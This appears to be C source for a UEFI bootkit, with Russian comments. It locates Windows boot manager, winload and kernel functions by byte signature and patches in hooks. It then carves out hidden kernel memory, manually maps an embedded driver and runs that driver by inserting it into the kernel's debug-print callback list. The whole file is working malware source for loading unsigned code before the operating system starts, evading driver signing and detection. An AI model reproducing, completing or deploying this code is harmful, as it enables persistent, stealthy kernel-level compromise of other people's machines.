#include <Uefi.h>

#include <Protocol/LoadedImage.h>

#include <Library/BaseLib.h>
#include <Library/DevicePathLib.h>
#include <Library/BaseMemoryLib.h>

#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>

#include "targetDriver.h"

#include "hooks.h"
#include "utils.h"
#include "globals.h"

/* bootmgr sigs */
UINT8 SigImgArchStartBootApplication[] = { 0x89, 0x46, 0x1C, 0x48, 0x8D, 0x05 };

/* winload sigs*/
UINT8 SigBlImgAllocateImageBuffer[]		= { 0xE8, 0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x8B, 0x6D, 0x60 };
UINT8 SigOslArchTransferToKernel[]		= { 0x0F, 0x31, 0x48, 0xC1, 0xE2, 0x20, 0x48, 0x8B, 0xCF };

/* ntoskrnl sigs */
UINT8 SigRtlpDebugPrintCallbacksActive[]	= { 0x80, 0x3D, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x0F, 0x84, 0xCC, 0xCC, 0xCC, 0xCC, 0x45, 0x8B, 0xC4 };
UINT8 SigRtlpDebugPrintCallbackList[]		= { 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xC7, 0x18 };

INT64
EFIAPI
oBlImgAllocateImageBufferProxy(
	UINT8* ImageBuffer,
	UINT64 ImageSize,
	UINT32 MemoryType,
	UINT32 Attributes,
	VOID* UnUsed,
	UINT32 Flags
);

EFI_STATUS
EFIAPI
hkBlImgAllocateImageBuffer(
	UINT8** ImageBuffer,
	UINT64 ImageSize,
	UINT32 MemoryType,
	UINT32 Attributes,
	VOID* UnUsed,
	UINT32 Flags
) {
	INT64 ostatus = NULL;
	INT64 mstatus = NULL;

	ostatus = oBlImgAllocateImageBufferProxy(ImageBuffer, ImageSize, MemoryType, Attributes, UnUsed, Flags);

	if (NT_SUCCESS(ostatus)) {
		if (gDriverBuffer == NULL && MemoryType == 0xE0000012) { //Выделяем себе местечко под солнцем
			mstatus = oBlImgAllocateImageBufferProxy(&gDriverBuffer, gDriverSize + 40, 0xE0000012, 0x424000, UnUsed, 0);

			if (!NT_SUCCESS(mstatus)) {
				return ostatus;	
			}
		}
	}

	return ostatus;
};

EFI_STATUS
EFIAPI
hkOslArchTransferToKernel(
	PLOADER_PARAMETER_BLOCK KernelParams,
	VOID*					KiSystemStartup
) {
	PKLDR_DATA_TABLE_ENTRY kernelEntry = NULL;
	
	UINT8*  rtlpDebugPrintCallbacksActive	= NULL;
	UINT8*	rtlpDebugPrintCallbackList		= NULL;

	UINT8*	imageBase		= NULL;
	UINT8*  entryPoint		= NULL;

	UINT8*	kernelBase		= NULL;
	UINT32	kernelSize		= 0;

	EFI_STATUS efiStatus;

	*(INT32*)(gCallToOslArchTransferToKernel + 1) = BkCalcRelativeOffset(gCallToOslArchTransferToKernel, oOslArchTransferToKernel, 1);
	
	kernelEntry = BkGetLoadedModule(&KernelParams->LoadOrderListHead, L"ntoskrnl.exe");
	
	if (!kernelEntry)
		return oOslArchTransferToKernel(KernelParams, KiSystemStartup);

	kernelBase = kernelEntry->ImageBase;
	kernelSize = kernelEntry->SizeOfImage;

	if (gDriverBuffer != NULL) {
		
		efiStatus = BkFindPattern(SigRtlpDebugPrintCallbackList, 0xCC, sizeof(SigRtlpDebugPrintCallbackList), kernelBase, kernelSize, &rtlpDebugPrintCallbackList);

		if (EFI_ERROR(efiStatus)) {
			return oOslArchTransferToKernel(KernelParams, KiSystemStartup);
		}

		efiStatus = BkFindPattern(SigRtlpDebugPrintCallbacksActive, 0xCC, sizeof(SigRtlpDebugPrintCallbacksActive), kernelBase, kernelSize, &rtlpDebugPrintCallbacksActive);

		if (EFI_ERROR(efiStatus)) {
			return oOslArchTransferToKernel(KernelParams, KiSystemStartup);
		}
		
		imageBase = (gDriverBuffer + 40);

		efiStatus = BkLoadImage(kernelBase, targetDriver, imageBase, &entryPoint);

		if (!EFI_ERROR(efiStatus)) {
			rtlpDebugPrintCallbackList = BkCalcRelative32(rtlpDebugPrintCallbackList, 3);
			rtlpDebugPrintCallbacksActive = BkCalcRelative32(rtlpDebugPrintCallbacksActive, 2) + 1;

			*(UINT64*)(gDriverBuffer) = NULL;
			*(UINT64*)(gDriverBuffer + 8) = NULL;

			*(UINT64*)(gDriverBuffer + 16) = (UINT64)entryPoint; //каллбек

			*(UINT64*)(gDriverBuffer + 24) = (UINT64)rtlpDebugPrintCallbackList; //&RtlpDebugPrintCallbackList
			*(UINT64*)(gDriverBuffer + 32) = (UINT64)rtlpDebugPrintCallbackList; //&RtlpDebugPrintCallbackList

			*(UINT64*)(rtlpDebugPrintCallbackList) = (UINT64)(gDriverBuffer + 24);
			*(UINT64*)(rtlpDebugPrintCallbackList + 8) = (UINT64)(gDriverBuffer + 24);

			*(UINT8*)(rtlpDebugPrintCallbacksActive) = TRUE; // Активируем каллбеки на DbgPrint
		}

	};

	return oOslArchTransferToKernel(KernelParams, KiSystemStartup);
}

EFI_STATUS
EFIAPI
hkImgArchEfiStartBootApplication(
	VOID* First,
	UINT8* ImageBase,
	VOID* Third,
	VOID* Fourth
) {
	PIMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS ntHeaders;

	EFI_STATUS efiStatus;
	
	UINT8* allocateImageBufferAddress	= NULL;
	UINT8* transferToKernelAddress		= NULL;
	UINT8* BlImgAllocateImageBuffer		= NULL;
	
	UINT8* codeSection					= NULL;
	UINT64 codeSize						= NULL;

	if (ImageBase != NULL) {
		
		dosHeader = (PIMAGE_DOS_HEADER)ImageBase;

		if (dosHeader->e_magic != 0x5A4D) { //MZ
			return oImgArchStartBootApplication(First, ImageBase, Third, Fourth);
		}

		ntHeaders	= (PIMAGE_NT_HEADERS)(ImageBase + dosHeader->e_lfanew);
		
		if (ntHeaders == NULL) {
			return oImgArchStartBootApplication(First, ImageBase, Third, Fourth);
		}

		codeSection = ImageBase + ntHeaders->OptionalHeader.BaseOfCode;
		codeSize	= ntHeaders->OptionalHeader.SizeOfCode;
		
		/* Находим нужные функции в winload.efi */

		efiStatus = BkFindPattern(SigBlImgAllocateImageBuffer, 0xCC, sizeof(SigBlImgAllocateImageBuffer), codeSection, codeSize, &allocateImageBufferAddress);

		if (EFI_ERROR(efiStatus)) {
			return oImgArchStartBootApplication(First, ImageBase, Third, Fourth);
		}

		efiStatus = BkFindPattern(SigOslArchTransferToKernel, 0xCC, sizeof(SigOslArchTransferToKernel), codeSection, codeSize, &transferToKernelAddress);

		if (EFI_ERROR(efiStatus)) {
			return oImgArchStartBootApplication(First, ImageBase, Third, Fourth);
		}
		
		/* Ставим хук на BlImgAllocateImageBuffer для подмены размеров модулей */

		BlImgAllocateImageBuffer = BkCalcRelative32(allocateImageBufferAddress, 1);
		
		*BlImgAllocateImageBuffer = 0xE9; // JMP
		*(INT32*)(BlImgAllocateImageBuffer + 1) = BkCalcRelativeOffset(BlImgAllocateImageBuffer, &hkBlImgAllocateImageBuffer, 1);

		gBlImgAllocateImageBuffer = BlImgAllocateImageBuffer + 5; // Адресс для JMP

		/* Ставим хук на OslArchTransferToKernel дабы найти ntoskrnl.exe ImageBase */

		gCallToOslArchTransferToKernel	= transferToKernelAddress + 0x28;
		oOslArchTransferToKernel		= BkCalcRelative32(gCallToOslArchTransferToKernel, 1);

		*(INT32*)(gCallToOslArchTransferToKernel + 1)	 = BkCalcRelativeOffset(gCallToOslArchTransferToKernel, &hkOslArchTransferToKernel, 1);		// Ставим хук на OslArchTransferToKernel
		*(INT32*)(gJmpToImgArchStartBootApplication + 1) = BkCalcRelativeOffset(gJmpToImgArchStartBootApplication, oImgArchStartBootApplication, 1);	//Снимаем хук с ImgArchEfiStartBootApplication
	}

	return oImgArchStartBootApplication(First, ImageBase, Third, Fourth);
}

EFI_STATUS
InstallImgArchStartBootApplicationHook(
	IN VOID*		LocalImageBase,
	IN EFI_HANDLE	BootMgrHandle
) {
	EFI_LOADED_IMAGE* bootMgrImage = NULL;

	EFI_STATUS efiStatus = EFI_SUCCESS;

	UINT8* found = NULL;

	efiStatus = gBS->HandleProtocol(BootMgrHandle, &gEfiLoadedImageProtocolGuid, (VOID**)&bootMgrImage);
	
	if (EFI_ERROR(efiStatus)) {
		return efiStatus;
	}

	efiStatus = BkFindPattern(SigImgArchStartBootApplication, 0xCC, sizeof(SigImgArchStartBootApplication), bootMgrImage->ImageBase, bootMgrImage->ImageSize, &found);

	if (EFI_ERROR(efiStatus)) {
		return efiStatus;
	}
	
	gDriverSize = BkGetSizeOfPE(targetDriver);

	if (gDriverSize == 0) {
		return EFI_NOT_FOUND;
	}

	gJmpToImgArchStartBootApplication	= BkCalcRelative32(found + 3, 3);
	oImgArchStartBootApplication		= BkCalcRelative32(gJmpToImgArchStartBootApplication, 1);

	*(INT32*)(gJmpToImgArchStartBootApplication + 1) = BkCalcRelativeOffset(gJmpToImgArchStartBootApplication, &hkImgArchEfiStartBootApplication, 1);

	return efiStatus;
}